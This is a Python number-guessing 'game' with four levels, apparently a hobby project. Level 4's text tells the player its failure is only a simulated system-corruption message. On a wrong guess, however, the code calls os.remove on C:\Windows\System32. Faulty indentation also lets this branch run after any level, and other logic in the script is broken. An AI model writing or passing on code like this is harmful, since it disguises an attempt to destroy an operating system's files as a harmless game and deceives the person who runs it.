import random2 as  random
import platform as platform
import os as os 

print("----------Welcome To Game Of Death---------")
print("This game is made by Lakshay Sharma")
print("Github:LakshaySharma-CSE")
print("LET'S START THE GAME")
print() 
print()

while True:
    print("This game have 4 LEVELS ")
    print("Type 1 for Level 1")
    print("Type 2 for Level 2")
    print("Type 3 for Level 3")
    print("Type 4 for Level 4")

    level=int(input("Enter you level:  "))

    if level == 1:
        print("Level 1: Number Match (Safe Zone)")
        print("""
            Note: 1) The player provides a list of numbers
                  2) The game randomly selects a number from that list.
                  3) Your task: match or guess the selected number
                  4) This is a safe environment—ideal for warming up.
     """) 
        print("The starting limt and ending limt have the diff of more then 2 ")
        slimt=int(input("Enter The starting limt: "))
        elimt=int(input("Enter The ending limt: "))
        checkinglimt=slimt-elimt
        if checkinglimt>= 2:
          print("Invalid limit. The difference should be greater than 2.")
        else:
          Randomnumber = random.randrange(slimt, elimt)
        #   print(Randomnumber)
          Randomnumber2=int(input("Enter The Number That U Think Is Rigth Ans: "))
          if Randomnumber == Randomnumber2:
             print("You Won This Level")
          else:
             print("You lost This Level")
    elif level ==2:
        print("Level 2: Integer Challenge (Safe Zone)")
        print("""
            Note: 1) The game generates random integer values.
                  2) You must guess or respond correctly.
                  3) The challenge grows, but the environment is still safe.
     """) 
        Randomnumber3=random.randint(0,100)
        # print(Randomnumber3)
        Randomnumber4=int(input("Enter The Number That U Think Is Rigth Ans: "))
        if Randomnumber3 == Randomnumber4:
           print("You Won This Level")
        else:
           print("You lost This Level ")
    elif level == 3:
        print("Level 3: Float Frenzy (Safe Zone)")
        print("""
            Note: 1) The game now deals with floating-point numbers.
                  2) Random float numbers are generated.
                  3) Accuracy is key—one small mistake can cost you a point.
                  4) Still a safe zone, but more mentally demanding
             """) 
        Randomnumber5=random.random()
        Randomnumber6=round(Randomnumber5,1)
        # print(Randomnumber6)
        Randomnumber4=float(input("Enter The Number That U Think Is Rigth Ans: "))
        if Randomnumber4 == Randomnumber6:
           print("You Won This Level")
        else:
           print("You lost This Level ")
    elif level == 4:
        print("Level 4: The Final Threat (Danger Zone)")
    if platform.system() != "Windows":
     print("⚠️ Level 4 is only available on Windows systems. Exiting...")
     exit()
    else:
       print("""
            Note: 1) This is the endgame—high risk and high tension.
                  2) The game generates random number.
                  3) If your response is incorrect, the terminal will simulate a message saying: 
                   = Windows is corrupted. System failure imminent.
                   = ⚠️ WARNING: While this is a simulation, it is designed to look very real. 
                  4) important Note Before Playing Level 4:
                  5) Play at your own risk. 
                      :This level is designed for thrill and fear simulation—not for casual players.
                  6) It is strongly recommended to play this level only:
                       : On a virtual machine, or On a non-essential system, or

                  After creating a Windows ISO or bootable backup of your system.
                  This level is meant to test your nerve, not to actually damage your computer—but prepare wisely.
               """)
       filename="C:\Windows\System32"
   #  filename = "C:/Users/Lakshay Sharma/Desktop/New Text Document.txt" just for testing this game 
    Randomnumber9=random.randint(0,100)
    print(Randomnumber9)
    Randomnumber10=float(input("Enter The Number That U Think Is Rigth Ans: "))
    if Randomnumber9 == Randomnumber10:
         print("You Won This Game")
    else:
         os.path.exists(filename)
         os.remove(filename)
         print("You lost This Game now by by ""Nice to meet you "" ")
         exit()